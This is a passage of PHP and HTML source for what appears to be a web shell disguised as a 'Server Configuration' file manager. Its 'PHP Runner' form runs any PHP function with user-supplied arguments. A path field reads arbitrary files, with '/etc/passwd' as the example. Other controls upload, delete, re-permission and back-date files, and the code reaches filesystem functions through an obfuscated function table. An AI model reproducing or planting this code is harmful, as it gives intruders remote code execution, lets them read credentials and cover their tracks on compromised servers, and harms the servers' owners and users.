.term-sec-head{display:flex;align-items:center;gap:8px;margin-bottom:6px;color:#9aa4b2;font-size:9px;font-weight:700;letter-spacing:.16em;text-transform:uppercase;white-space:nowrap}
.term-sec-head:after{content:"";flex:1 1 auto;height:1px;background:linear-gradient(90deg,#30363d,rgba(48,54,61,0))}
.term-sec-num{color:#3fb950;font-weight:600;letter-spacing:.02em}
.term-row{display:grid;grid-template-columns:152px minmax(0,1fr);gap:14px;align-items:start;padding:3px 0;border-bottom:1px dashed rgba(48,54,61,.38)}
.term-row:last-child{border-bottom:0}
.term-k{color:#8b949e;font-size:10px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.term-v{min-width:0;color:#c9d1d9;text-align:right;word-break:break-word;font-size:10px}
.term-v.left{text-align:left}
.term-ok{color:#3fb950}
.term-warn{color:#e3b341}
.term-bad{color:#ff7b72}
.term-dim{color:#8b949e}
.term-link{display:inline-flex;align-items:center;gap:4px;margin-left:5px;padding:1px 5px;border:1px solid #3d444d;border-radius:3px;background:#161b22;color:#c9d1d9;font-family:inherit;font-size:9px;font-weight:600;letter-spacing:.06em;text-transform:uppercase;cursor:pointer;vertical-align:1px}
.term-link:hover{border-color:#3fb950;color:#7ee787;background:#0d1117}
.term-pre{margin:6px 0 0;padding:9px 10px;border:1px solid #21262d;border-radius:6px;background:#010409;color:#8b949e;font-family:inherit;font-size:9px;line-height:1.6;white-space:pre-wrap;word-break:break-word;overflow:auto;max-height:210px;scrollbar-width:thin}
.term-pre::-webkit-scrollbar{width:7px;height:7px}
.term-pre::-webkit-scrollbar-thumb{background:#30363d;border-radius:4px}
.term-df{color:#c9d1d9}
.term-bar{color:#3fb950;letter-spacing:-1px}
.term-bar.warn{color:#d29922}
.term-bar.bad{color:#f85149}
.term-footer{flex:0 0 auto;display:flex;align-items:center;justify-content:space-between;gap:10px;padding:8px 12px;border-top:1px solid #21262d;background:#0d1117}
.term-hint{color:#8b949e;font-size:10px;letter-spacing:.02em}
.term-footer-btn{height:24px;padding:0 10px;border:1px solid #3d444d;border-radius:4px;background:#161b22;color:#c9d1d9;font-family:inherit;font-size:10px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;cursor:pointer}
.term-footer-btn:hover{border-color:#3fb950;color:#7ee787}
.up-panel{position:fixed;left:24px;bottom:24px;z-index:60;width:min(340px,calc(100vw - 32px));padding:10px 11px 10px 12px;border:1px solid #27272a;border-radius:8px;background:#18181b;color:#e4e4e7;box-shadow:0 10px 15px -3px rgba(0,0,0,.3);font-family:Inter,ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif}
.up-panel.hidden{display:none}
.up-head{display:flex;align-items:center;gap:7px;min-width:0}
.up-dot{flex:0 0 auto;width:6px;height:6px;border-radius:50%;background:#a1a1aa}
.up-panel.ok .up-dot{background:#4ade80;box-shadow:0 0 6px rgba(74,222,128,.4)}
.up-panel.err .up-dot{background:#f87171;box-shadow:0 0 6px rgba(248,113,113,.4)}
.up-label{flex:0 0 auto;font-size:11px;font-weight:500;color:#f4f4f5;white-space:nowrap}
.up-name{flex:1 1 auto;min-width:0;font-size:10px;color:#a1a1aa;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.up-pct{flex:0 0 auto;font-family:"JetBrains Mono",ui-monospace,monospace;font-size:9px;color:#a1a1aa}
.up-x{flex:0 0 auto;width:16px;height:16px;display:inline-flex;align-items:center;justify-content:center;border:0;border-radius:3px;background:transparent;color:#71717a;font-size:8px;cursor:pointer;transition:background .15s,color .15s}
.up-x:hover{background:#27272a;color:#f4f4f5}
.up-track{margin-top:8px;height:2px;border-radius:999px;background:#27272a;overflow:hidden}
.up-fill{height:100%;width:0;border-radius:999px;background:#a1a1aa;transition:width .18s ease}
.up-panel.ok .up-fill{background:#4ade80}
.up-panel.err .up-fill{background:#f87171}
.up-detail{display:none;margin-top:7px;font-size:9px;line-height:1.4;color:#f87171;word-break:break-word}
.up-panel.err .up-detail{display:block}
.msg{position:fixed;bottom:24px;right:24px;padding:12px 20px;border-radius:8px;font-size:13px;font-weight:500;z-index:9999;background:#18181b;color:#e4e4e7;border:1px solid #27272a;box-shadow:0 10px 15px -3px rgba(0,0,0,.3);display:flex;align-items:center;gap:10px;transition:opacity .3s,transform .3s}
.msg::before{content:'';width:6px;height:6px;border-radius:50%;flex:0 0 auto}
.msg.ok::before{background:#4ade80;box-shadow:0 0 8px rgba(74,222,128,.4)}
.msg.err::before{background:#f87171;box-shadow:0 0 8px rgba(248,113,113,.4)}
.msg.out{opacity:0;transform:translateY(100%)}
@media (max-width:640px){
  .fm-path-bar{flex-wrap:wrap}
  .fm-crumbs{flex:1 1 100%}
  .fm-path-bar .fm-search{flex:1 1 100%;max-width:none}
  .fm-pg-num{padding:0 4px;min-width:20px}
  .fm-list-foot{align-items:flex-start;gap:7px}
  .fm-list-foot .fm-server{display:none}
  .fm-pager{width:100%;justify-content:flex-start;gap:6px}
  .fm-list-foot-paged .fm-pg-count{display:none}
  .fm-pg-jump{margin-left:auto}
  .term-window{max-height:90vh;border-radius:8px}
  .term-body{padding:12px 12px 16px}
  .term-row{grid-template-columns:106px minmax(0,1fr);gap:9px}
  .term-k{font-size:10px}
  .term-v{font-size:10px}
  .term-title{font-size:9px}
  .term-pre{font-size:9px}
  .up-panel{left:16px;right:16px;bottom:16px;width:auto}
}
.duration-400{transition-duration:.4s}
.fm-cmd-row{display:flex;align-items:stretch;border-bottom:1px solid #27272a;min-width:0}
.fm-run-form{flex:1 1 auto;min-width:0}
.fm-cmd-sep{flex:0 0 auto;width:1px;margin:8px 0;background:#3f3f46;opacity:.55}
.fm-view-inline{display:flex;align-items:center;gap:7px;flex:0 1 300px;min-width:0;padding:8px 12px}
.fm-view-inline>i{flex:0 0 auto;color:#71717a;font-size:11px}
.fm-view-inline input[type=text]{flex:1 1 auto;width:100%;min-width:0;height:22px;padding:0;border:0;border-bottom:1px solid #3f3f46;border-radius:0;background:transparent;color:#e4e4e7;font-family:"JetBrains Mono",ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;font-size:10px;outline:none;transition:border-color .15s}
.fm-view-inline input[type=text]::placeholder{color:#71717a}
.fm-view-inline input[type=text]:focus{border-bottom-color:#a1a1aa}
@media (max-width:640px){
  .fm-cmd-row{flex-direction:column;align-items:stretch}
  .fm-cmd-sep{display:none}
  .fm-view-inline{flex:1 1 auto;border-top:1px solid #27272a;padding:8px 12px}
}
</style>
</head>
<body class="bg-bg text-zinc-800 font-sans text-xs antialiased h-screen w-full flex flex-col items-center py-6 sm:py-8 overflow-y-auto">
<div class="w-full max-w-5xl px-4 flex flex-col gap-4 pb-24">
<div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
<div class="min-w-0 ml-1">
<h1 class="font-bold text-zinc-900 tracking-tight text-sm leading-tight">Server Configuration</h1>
<p class="text-[9px] text-zinc-500 font-mono break-all leading-tight"><?php echo fh($uname_display!==''?$uname_display:PHP_OS); ?></p>
</div>
<div class="flex items-center gap-2 w-full sm:w-auto">
<button onclick="hm()" class="flex-1 sm:flex-none justify-center group flex items-center gap-1.5 px-3 py-1.5 bg-white border border-border rounded-md shadow-sm hover:border-zinc-400 hover:text-black transition-all text-zinc-500 text-[11px]">
<i class="ph ph-house text-xs"></i> <span class="font-medium">Home</span>
</button>
<button onclick="md('m-info')" class="flex-1 sm:flex-none justify-center group flex items-center gap-1.5 px-3 py-1.5 bg-white border border-border rounded-md shadow-sm hover:border-zinc-400 hover:text-black transition-all text-zinc-500 text-[11px]">
<i class="ph ph-info text-xs"></i> <span class="font-medium">Info</span>
</button>
<button onclick="cl()" class="flex-1 sm:flex-none justify-center group flex items-center gap-1.5 px-3 py-1.5 bg-white border border-border rounded-md shadow-sm hover:border-zinc-400 hover:text-black transition-all text-zinc-500 text-[11px]">
<i class="ph ph-arrows-clockwise text-xs group-hover:animate-spin"></i> <span class="font-medium">Refresh</span>
</button>
<?php if($fm_auth_enabled): ?>
<a href="?fm_logout=1" class="flex-1 sm:flex-none justify-center group flex items-center gap-1.5 px-3 py-1.5 bg-white border border-border rounded-md shadow-sm hover:border-zinc-400 hover:text-black transition-all text-zinc-500 text-[11px]">
<i class="ph ph-sign-out text-xs"></i> <span class="font-medium">Logout</span>
</a>
<?php endif; ?>
</div>
</div>

<div class="bg-white border border-zinc-200 rounded-lg p-1 shadow-sm flex flex-col sm:flex-row gap-1 sm:gap-2 items-center">
<form onsubmit="g(document.getElementById('pi').value);return false;" class="relative w-full sm:flex-1 group">
<div class="absolute inset-y-0 left-0 pl-2.5 flex items-center pointer-events-none text-zinc-400"><i class="ph-bold ph-folder-open text-sm"></i></div>
<input type="text" id="pi" value="<?php echo fh($b1); ?>" class="block w-full h-8 pl-8 pr-10 bg-zinc-50 border border-zinc-200 rounded text-[11px] font-mono font-medium text-zinc-700 focus:bg-white focus:ring-1 focus:ring-zinc-900 focus:border-zinc-900 outline-none transition-all placeholder-zinc-400 shadow-sm" placeholder="/path/to/directory">
<button class="absolute inset-y-0.5 right-0.5 px-2 bg-white border border-zinc-200 rounded-[3px] text-[9px] font-bold text-zinc-500 hover:text-zinc-900 hover:border-zinc-300 uppercase tracking-wide transition-all">GO</button>
</form>
<div class="hidden sm:block w-px h-5 bg-zinc-200"></div>
<div class="flex items-center gap-1 w-full sm:w-auto">
<div class="flex items-center gap-1 flex-1 sm:flex-none min-w-0">
<form id="uploadForm" action="<?php echo fh($upload_action); ?>" method="post" enctype="multipart/form-data" class="flex items-center gap-1 flex-1 sm:flex-none min-w-0">
<input type="hidden" name="x" value="<?php echo fh($b3); ?>">
<input type="hidden" name="z" value="up">
<label for="<?php echo fh($a3); ?>" class="flex-1 sm:w-24 h-8 cursor-pointer bg-zinc-50 border border-dashed border-zinc-300 rounded px-2 text-[10px] text-zinc-500 hover:bg-zinc-100 hover:border-zinc-400 hover:text-zinc-700 flex items-center gap-1.5 transition-all group select-none overflow-hidden min-w-0">
<i class="ph-bold ph-paperclip text-zinc-400 group-hover:text-zinc-600 text-xs flex-shrink-0"></i>
<span id="fn" class="truncate font-medium">Choose...</span>
</label>
<input type="file" id="<?php echo fh($a3); ?>" name="upload_file" class="hidden">
<button type="submit" class="h-8 px-3 flex items-center justify-center gap-1.5 bg-zinc-900 text-white border border-zinc-900 rounded shadow-sm hover:bg-zinc-800 active:scale-95 transition-all flex-shrink-0 text-[10px] font-medium whitespace-nowrap">
<i class="ph-bold ph-upload-simple text-xs"></i>
<span>Upload</span>
</button>
</form>
</div>
<div class="w-px h-5 bg-zinc-200 mx-0.5"></div>
<div class="flex items-center gap-1 flex-shrink-0">
<button onclick="md('md')" class="h-8 px-2.5 flex items-center justify-center gap-1.5 bg-white text-zinc-700 border border-zinc-200 rounded shadow-sm hover:bg-zinc-50 hover:border-zinc-300 hover:text-zinc-900 active:bg-zinc-100 transition-all text-[10px] font-medium whitespace-nowrap">
<i class="ph-bold ph-folder-plus text-xs"></i> <span>Folder</span>
</button>
<button onclick="md('mf')" class="h-8 px-2.5 flex items-center justify-center gap-1.5 bg-white text-zinc-700 border border-zinc-200 rounded shadow-sm hover:bg-zinc-50 hover:border-zinc-300 hover:text-zinc-900 active:bg-zinc-100 transition-all text-[10px] font-medium whitespace-nowrap">
<i class="ph-bold ph-file-plus text-xs"></i> <span>File</span>
</button>
</div>
</div>
</div>

<div class="group relative bg-[#18181b] rounded-lg overflow-hidden border border-zinc-800 shadow-md flex flex-col">
<div class="bg-[#27272a] px-3 py-1.5 flex items-center justify-between border-b border-zinc-700">
<div class="flex items-center gap-2">
<i class="ph-fill ph-terminal text-zinc-400 text-xs"></i>
<span class="text-[10px] font-mono text-zinc-400 uppercase tracking-wider">PHP Runner (<?php echo fh(phpversion()); ?>)</span>
</div>
<div class="flex gap-1.5">
<div class="w-2 h-2 rounded-full bg-red-500/50"></div>
<div class="w-2 h-2 rounded-full bg-yellow-500/50"></div>
<div class="w-2 h-2 rounded-full bg-green-500/50"></div>
</div>
</div>
<div class="fm-cmd-row">
<form method="post" action="<?php echo fh($sp1); ?>" onsubmit="document.getElementById('hx').value=en(<?php echo fm_js($b1); ?>); fr_save();" class="fm-run-form flex items-center px-3 py-2 gap-2 m-0">
<input type="hidden" name="x" id="hx" value="">
<span class="text-green-500 font-mono font-bold">$</span>
<input type="text" id="fi" name="cmd_func" value="" onkeydown="if(event.key==='Enter'){event.preventDefault();document.getElementById('gi').focus();}" class="w-20 bg-transparent text-blue-400 font-mono text-xs focus:outline-none placeholder-zinc-500" placeholder="func" autocomplete="on">
<input type="text" id="gi" name="cmd_args" value="" class="flex-1 bg-transparent text-zinc-300 font-mono text-xs focus:outline-none placeholder-zinc-500" placeholder="args" autocomplete="on">
<button type="submit" class="text-zinc-500 hover:text-white font-mono text-[10px] uppercase border border-zinc-700 px-2 py-0.5 rounded hover:bg-zinc-800 transition-colors">Run</button>
</form>
<div class="fm-cmd-sep" aria-hidden="true"></div>
<form method="post" action="<?php echo fh($sp1); ?>" class="fm-view-inline" autocomplete="off" title="Open any readable file by path">
<input type="hidden" name="x" value="<?php echo fh($b3); ?>">
<input type="hidden" name="y" value="v">
<i class="ph-bold ph-file-text" aria-hidden="true"></i>
<input type="text" name="view_path" placeholder="/etc/passwd" aria-label="Open file by absolute path" spellcheck="false" required>
<button type="submit" class="text-zinc-500 hover:text-white font-mono text-[10px] uppercase border border-zinc-700 px-2 py-0.5 rounded hover:bg-zinc-800 transition-colors">View</button>
</form>
</div>
<?php if($fr): ?>
<div class="bg-[#18181b] p-3 overflow-x-auto border-t border-zinc-700">
<pre class="font-mono text-[10px] text-zinc-400 leading-relaxed whitespace-pre-wrap"><?php echo fh($fr); ?></pre>
</div>
<?php endif; ?>
</div>

<div class="flex flex-wrap items-center gap-1 text-[11px] font-medium text-zinc-700 px-1 fm-path-bar">
<div class="fm-crumbs">
<i class="ph-fill ph-hard-drives text-zinc-500 mr-1"></i>
<?php
$sp=(strpos($b1,'/')!==false)?'/':'\\';
$pt=explode($sp,$b1);
$bd='';
$crumb_items=array();
if(strpos($b1,$sp)===0){
    $bd=$sp;
    $crumb_items[]=array('label'=>'root','path'=>'/');
}
foreach($pt as $i=>$p){
    if($p==='')continue;
    $bd.=$p.$sp;
    $t=substr($bd,0,-1);
    if($i===0&&strpos($p,':')!==false)$t=$p.$sp;
    $crumb_items[]=array('label'=>$p,'path'=>$t);
}
$crumb_first=true;
foreach($crumb_items as $ci){
    echo'<span class="fm-crumb-unit">';
    if(!$crumb_first)echo'<span class="fm-crumb-sep" aria-hidden="true">'.fh($sp).'</span>';
    $crumb_first=false;
    echo'<a onclick="pf('.fm_js($ci['path']).')" title="'.fh($ci['path']).'" class="hover:text-black hover:bg-zinc-200 px-1.5 py-0.5 rounded cursor-pointer transition-colors">'.fh($ci['label']).'</a>';
    echo'</span>';
}
?>
<span class="fm-crumb-gap hidden" aria-hidden="true">...</span>
</div>
<form method="post" action="<?php echo fh($sp1); ?>" class="fm-search fm-search-inline" autocomplete="off" role="search">
<input type="hidden" name="x" value="<?php echo fh($b3); ?>">
<input type="hidden" name="y" value="l">
<div class="fm-search-field">
<i class="ph-bold ph-magnifying-glass" aria-hidden="true"></i>
<input type="text" name="q" value="<?php echo fh($q); ?>" placeholder="Search files and folders" maxlength="200" spellcheck="false" aria-label="Search files and folders" aria-keyshortcuts="/">
<?php if($q===''): ?><kbd class="fm-search-kbd" aria-hidden="true">/</kbd><?php endif; ?>
</div>
<?php if($q!==''): ?><button type="button" class="fm-search-clear" onclick="sc()">Clear</button><?php endif; ?>
<button type="submit" class="fm-search-submit" title="Search (Enter)">Search</button>
</form>
</div>

<?php if($ed): ?>
<div class="bg-surface border border-zinc-200 rounded-lg shadow-lg overflow-hidden flex flex-col h-[75vh] min-h-[600px] mb-10">
    <div class="bg-zinc-50 border-b border-zinc-200 px-4 py-2.5 flex flex-wrap sm:flex-nowrap justify-between items-center gap-3">
        <div class="flex items-center gap-3 min-w-0">
            <div class="flex items-center gap-2 text-zinc-600 font-mono text-xs">
                <i class="ph-bold ph-file-text"></i>
                <span class="font-semibold text-zinc-800 truncate max-w-[150px] sm:max-w-[300px]" title="<?php echo fh($fi_name); ?>"><?php echo fh($fi_name); ?></span>
                <span class="bg-white border border-zinc-200 px-1.5 py-0.5 rounded shadow-sm text-zinc-600 text-[9px]"><?php echo fh($fi_sz); ?></span>
            </div>
            <?php if($m): ?>
            <span class="px-2 py-0.5 rounded text-[10px] font-medium <?php echo $es?'bg-green-100 text-green-700':'bg-red-100 text-red-700'; ?> flex-shrink-0"><?php echo fh($m); ?></span>
            <?php endif; ?>
        </div>
        <div class="flex items-center gap-2 sm:gap-3 ml-auto sm:ml-0 overflow-x-auto scrollbar-none">
            <div class="flex gap-0.5 border-r border-zinc-200 pr-2 sm:pr-3 shrink-0">
                <button type="button" onclick="ph(<?php echo fm_js($fi_name); ?>,<?php echo fm_js($fi_o); ?>)" class="w-7 h-7 flex items-center justify-center text-zinc-400 hover:text-zinc-800 hover:bg-zinc-200 rounded transition-colors" title="Permissions"><i class="ph-bold ph-lock-key"></i></button>
                <button type="button" onclick="pr(<?php echo fm_js($fi_name); ?>)" class="w-7 h-7 flex items-center justify-center text-zinc-400 hover:text-zinc-800 hover:bg-zinc-200 rounded transition-colors" title="Rename"><i class="ph-bold ph-pencil-simple"></i></button>
                <button type="button" onclick="pt(<?php echo fm_js($fi_name); ?>,<?php echo fm_js($fi_mtime); ?>)" class="w-7 h-7 flex items-center justify-center text-zinc-400 hover:text-zinc-800 hover:bg-zinc-200 rounded transition-colors" title="Edit Date"><i class="ph-bold ph-calendar"></i></button>
                <button type="button" onclick="dl(<?php echo fm_js($fi_name); ?>)" class="w-7 h-7 flex items-center justify-center text-zinc-400 hover:text-zinc-800 hover:bg-zinc-200 rounded transition-colors" title="Download"><i class="ph-bold ph-download-simple"></i></button>
                <button type="button" onclick="pd(<?php echo fm_js($fi_name); ?>)" class="w-7 h-7 flex items-center justify-center text-zinc-400 hover:text-red-600 hover:bg-red-50 rounded transition-colors" title="Delete"><i class="ph-bold ph-trash"></i></button>
            </div>
            <div class="flex bg-zinc-200/50 p-0.5 rounded-md shrink-0">
                <button type="button" id="btn-mode-view" onclick="setMode('view')" class="px-3 py-1 text-[10px] font-bold uppercase rounded text-zinc-500 hover:text-zinc-900 transition-all">View</button>
                <button type="button" id="btn-mode-edit" onclick="setMode('edit')" class="px-3 py-1 text-[10px] font-bold uppercase rounded bg-white shadow-sm text-zinc-900 transition-all">Edit</button>
            </div>
            <div class="flex gap-2 ml-1 shrink-0">
                <button type="button" onclick="g(<?php echo fm_js($b1); ?>)" class="px-3 py-1.5 rounded-md text-zinc-500 hover:bg-zinc-200 text-xs font-medium transition-colors">Close</button>
                <button type="button" id="btn-save" onclick="sf()" class="px-3 py-1.5 bg-zinc-900 text-white rounded-md hover:bg-zinc-800 text-xs font-medium shadow-sm transition-transform active:scale-95">Save</button>
            </div>
        </div>
    </div>
    <div class="bg-zinc-50 border-b border-zinc-200 px-4 py-2 flex flex-wrap gap-x-6 gap-y-1.5 text-[10px] font-mono text-zinc-500 items-center select-text">
        <div class="flex items-center gap-1.5 whitespace-nowrap"><span class="text-zinc-400">Perm:</span> <span class="<?php echo ($fi_pc=='g'?'text-green-600':($fi_pc=='y'?'text-zinc-700':'text-red-600')); ?> font-medium"><?php echo fh($fi_perms); ?></span> <span class="<?php echo ($fi_pc=='g'?'text-green-500':($fi_pc=='y'?'text-zinc-400':'text-red-400')); ?>">(<?php echo fh($fi_o); ?>)</span></div>
        <div class="flex items-center gap-1.5 whitespace-nowrap"><span class="text-zinc-400">User:</span> <span class="text-zinc-700 font-medium truncate max-w-[120px]" title="<?php echo fh($fi_og); ?>"><?php echo fh($fi_og); ?></span></div>
        <div class="w-px h-3 bg-zinc-300 mx-0.5 hidden sm:block"></div>
        <div class="flex items-center gap-1.5 whitespace-nowrap"><span class="text-zinc-400">Created:</span> <span class="text-zinc-700 font-medium"><?php echo fh($fi_ctime); ?></span></div>
        <div class="flex items-center gap-1.5 whitespace-nowrap"><span class="text-zinc-400">Modified:</span> <span class="text-zinc-700 font-medium"><?php echo fh($fi_mtime); ?></span></div>
        <div class="flex items-center gap-1.5 whitespace-nowrap"><span class="text-zinc-400">Accessed:</span> <span class="text-zinc-700 font-medium"><?php echo fh($fi_atime); ?></span></div>
    </div>
    <div class="flex-1 overflow-hidden relative bg-white">
        <input type="hidden" id="edp" value="<?php echo fh($ef); ?>">
        <textarea id="edc" class="w-full h-full p-4 font-mono text-xs text-zinc-800 focus:outline-none resize-none leading-relaxed" spellcheck="false"><?php echo htmlspecialchars($ec,ENT_QUOTES,$ib?'ISO-8859-1':'UTF-8'); ?></textarea>
        <pre id="edv" class="hidden w-full h-full p-4 font-mono text-xs text-zinc-800 overflow-auto whitespace-pre-wrap break-all leading-relaxed bg-zinc-50"></pre>
    </div>
</div>
<?php else: ?>
<div id="pb" class="hidden bg-[#18181b] border border-zinc-800 rounded-lg shadow-md px-3 py-2.5 flex flex-wrap items-center gap-2 sm:gap-3">
<div class="flex items-center gap-2.5 min-w-0 flex-1">
<div class="w-1.5 h-1.5 rounded-full bg-green-400 shadow-[0_0_6px_rgba(74,222,128,0.4)] flex-shrink-0"></div>
<span id="pbt" class="text-[11px] text-zinc-300 font-medium truncate"></span>
</div>
<div class="flex items-center gap-2 flex-shrink-0">
<button onclick="cbPa()" class="h-7 px-3 bg-white text-zinc-900 rounded text-[10px] font-bold hover:bg-zinc-100 transition-colors shadow-sm flex items-center gap-1.5"><i class="ph-bold ph-clipboard text-[9px]"></i>Paste</button>
<button onclick="cbClr()" class="h-7 px-3 text-zinc-400 hover:text-zinc-200 border border-zinc-700 rounded text-[10px] font-medium hover:bg-zinc-800 transition-colors">Clear</button>
</div>
</div>
<?php
$all=array();
if($d=@$a2[3]($b1)){
    $ds=array();
    $fsl=array();
    while(($i=@$a2[4]($d))!==false){
        if($i==='.'||$i==='..')continue;
        $p=$b1.DIRECTORY_SEPARATOR.$i;
        if(@$a2[7]($p))$ds[]=$i;else $fsl[]=$i;
    }
    @$a2[5]($d);
    natsort($ds);
    natsort($fsl);
    foreach($ds as $i)$all[]=array('t'=>'d','n'=>$i);
    foreach($fsl as $i)$all[]=array('t'=>'f','n'=>$i);
}
$total_all=count($all);
$filtered=array();
if($q===''){$filtered=$all;}else{foreach($all as $it){if(fm_match_name($it['n'],$q))$filtered[]=$it;}}
$total=count($filtered);
$limit=500;
$pages=(int)ceil($total/$limit);
if($pages<1)$pages=1;
if($pg>$pages)$pg=$pages;
$offset=($pg-1)*$limit;
$items=array_slice($filtered,$offset,$limit);
$page_list=fm_page_list($pg,$pages);
?>
<div class="bg-white border border-zinc-200 rounded-lg shadow-sm overflow-hidden flex flex-col">
<div class="overflow-x-auto">
<table class="w-full text-left border-collapse text-[9px]">
<thead class="bg-zinc-50 border-b border-zinc-200">
<tr>
<th class="w-8 px-3 py-2 text-center border-r border-zinc-100">
<input type="checkbox" onchange="ts(this)" class="w-3.5 h-3.5 rounded-[3px] border-zinc-300 text-zinc-900 focus:ring-0 focus:ring-offset-0 focus:border-zinc-900 transition-all cursor-pointer bg-white checked:bg-zinc-900 checked:border-zinc-900">
</th>
<th class="px-3 py-2 font-semibold text-zinc-600 text-[9px] uppercase tracking-wider w-1/3 border-r border-zinc-100">Name</th>
<th class="px-3 py-2 font-semibold text-zinc-600 text-[9px] uppercase tracking-wider text-right w-20 border-r border-zinc-100">Size</th>
<th class="px-3 py-2 font-semibold text-zinc-600 text-[9px] uppercase tracking-wider w-32 border-r border-zinc-100 whitespace-nowrap">Date</th>
<th class="px-3 py-2 font-semibold text-zinc-600 text-[9px] uppercase tracking-wider text-center w-20 border-r border-zinc-100">Perm</th>
<th class="px-3 py-2 font-semibold text-zinc-600 text-[9px] uppercase tracking-wider w-32 border-r border-zinc-100">Owner/Group</th>
<th class="px-3 py-2 font-semibold text-zinc-600 text-[9px] uppercase tracking-wider text-right w-24">Actions</th>
</tr>
</thead>
<tbody class="divide-y divide-zinc-200">
<?php
if($pg==1&&$q===''){
?>
<tr class="group hover:bg-zinc-50 transition-colors cursor-pointer" onclick="g(<?php echo fm_js($a2[15]($b1)); ?>)">
<td class="px-3 py-2 border-r border-zinc-50 group-hover:border-zinc-100"></td>
<td class="px-3 py-2" colspan="6">
<div class="flex items-center gap-2 text-zinc-400 group-hover:text-zinc-800 transition-colors">
<i class="ph-bold ph-arrow-u-up-left text-sm"></i>
<span class="font-medium text-[11px]">.. (Parent)</span>
</div>
</td>
</tr>
<?php
}
$tr_class='class="group hover:bg-zinc-50 transition-colors"';
foreach($items as $it){
  $i=$it['n'];
  $type=$it['t'];
  $p=$b1.DIRECTORY_SEPARATOR.$i;
  $o=go($p);
  $c=pc($p);
  $dt=fmt_date($p);
  $s=($type==='f')?fs(@$a2[26]($p)):'-';
  $uid=@$a2[48]($p);$gid=@$a2[49]($p);
  $ow='0';$gr='0';
  if(function_exists($a2[40])){if($uid!==false){$pw=@$a2[40]($uid);if(is_array($pw)&&isset($pw['name']))$ow=$pw['name'];else $ow=$uid;}}
  if(function_exists($a2[41])){if($gid!==false){$pgr=@$a2[41]($gid);if(is_array($pgr)&&isset($pgr['name']))$gr=$pgr['name'];else $gr=$gid;}}
  $og=$ow.'/'.$gr;

  echo '<tr '.$tr_class.'>';
  echo '<td class="px-3 py-2 text-center border-r border-zinc-50 group-hover:border-zinc-100"><input type="checkbox" name="i[]" value="'.fh($i).'" onchange="bu()" class="w-3.5 h-3.5 rounded-[3px] border-zinc-300 text-zinc-900 focus:ring-0 focus:ring-offset-0 focus:border-zinc-900 transition-all cursor-pointer bg-white checked:bg-zinc-900 checked:border-zinc-900"></td>';
  echo '<td class="px-3 py-2 border-r border-zinc-50 group-hover:border-zinc-100">';
  if($type==='d'){
    echo '<a onclick="pf('.fm_js($p).')" class="flex items-center gap-2.5 cursor-pointer block">';
    echo '<i class="ph-fill ph-folder text-yellow-500 text-sm flex-shrink-0"></i>';
    echo '<span class="font-medium text-zinc-700 group-hover:text-black transition-colors truncate max-w-[200px] sm:max-w-xs text-[10px]">'.fh($i).'</span>';
    echo '</a>';
  }else{
    echo '<a onclick="v('.fm_js($p).')" class="flex items-center gap-2.5 cursor-pointer block">';
    echo '<i class="ph-fill ph-file-text text-zinc-400 text-sm flex-shrink-0"></i>';
    echo '<span class="font-medium text-zinc-700 group-hover:text-black transition-colors truncate max-w-[200px] sm:max-w-xs text-[10px]">'.fh($i).'</span>';
    echo '</a>';
  }
  echo '</td>';
  echo '<td class="px-3 py-2 text-right text-zinc-500 font-mono text-[9px] border-r border-zinc-50 group-hover:border-zinc-100 whitespace-nowrap">'.fh($s).'</td>';
  echo '<td class="px-3 py-2 text-zinc-500 font-mono text-[9px] border-r border-zinc-50 group-hover:border-zinc-100 cursor-pointer hover:text-blue-500 whitespace-nowrap" onclick="pt('.fm_js($i).','.fm_js($dt).')">'.fh($dt).'</td>';
  echo '<td class="px-3 py-2 text-center border-r border-zinc-50 group-hover:border-zinc-100"><span onclick="ph('.fm_js($i).','.fm_js($o).')" class="inline-block px-1.5 py-0.5 border rounded text-[8px] font-mono cursor-pointer whitespace-nowrap '.($c==='g'?'bg-green-50 text-green-700 border-green-200':($c==='y'?'bg-zinc-100 text-zinc-600 border-zinc-200':'bg-red-50 text-red-600 border-red-200')).'">'.fh(xp($p)).'</span></td>';
  echo '<td class="px-3 py-2 text-zinc-500 font-mono text-[9px] border-r border-zinc-50 group-hover:border-zinc-100 truncate max-w-[180px]">'.fh($og).'</td>';
  echo '<td class="px-3 py-2 text-right"><div class="flex items-center justify-end gap-2">';
  if($type==='f'){
      echo '<button onclick="v('.fm_js($p).')" class="p-1 text-zinc-400 hover:text-zinc-800 rounded hover:bg-zinc-200 transition-colors" title="Edit"><i class="ph-bold ph-code"></i></button>';
      echo '<button onclick="dl('.fm_js($i).')" class="p-1 text-zinc-400 hover:text-zinc-800 rounded hover:bg-zinc-200 transition-colors" title="Download"><i class="ph-bold ph-download-simple"></i></button>';
  }
  echo '<button onclick="pr('.fm_js($i).')" class="p-1 text-zinc-400 hover:text-zinc-800 rounded hover:bg-zinc-200 transition-colors" title="Rename"><i class="ph-bold ph-pencil-simple"></i></button>';
  echo '<button onclick="pd('.fm_js($i).')" class="p-1 text-zinc-400 hover:text-red-600 rounded hover:bg-red-50 transition-colors" title="Delete"><i class="ph-bold ph-trash"></i></button>';
  echo '</div></td></tr>';
}
if($total===0){
  echo '<tr><td colspan="7" class="fm-empty-cell"><div class="fm-empty">';
  if($q!==''){
    echo '<div class="fm-empty-ico"><i class="ph-bold ph-magnifying-glass"></i></div>';
    echo '<div class="fm-empty-title">No files match <span>'.fh($q).'</span></div>';
    echo '<div class="fm-empty-sub">Try a different term or clear the search.</div>';
    echo '<button type="button" class="fm-empty-btn" onclick="sc()">Clear search</button>';
  }else{
    echo '<div class="fm-empty-ico"><i class="ph-bold ph-folder-open"></i></div>';
    echo '<div class="fm-empty-title">This folder is empty</div>';
    echo '<div class="fm-empty-sub">Upload a file or create a folder to get started.</div>';
  }
  echo '</div></td></tr>';
}
?>
</tbody>
</table>
</div>
<div class="fm-list-foot<?php echo $pages>1?' fm-list-foot-paged':''; ?>">
<div class="fm-server"><b>Server</b><span><?php echo fh($software!==''?$software:'unknown'); ?></span></div>
<div class="fm-pager">
<span class="fm-pg-count"><?php echo (int)$total; ?> <?php echo $q!==''?'matches':'items'; ?></span>
<?php if($pages>1): ?>
<div class="fm-pg-control">
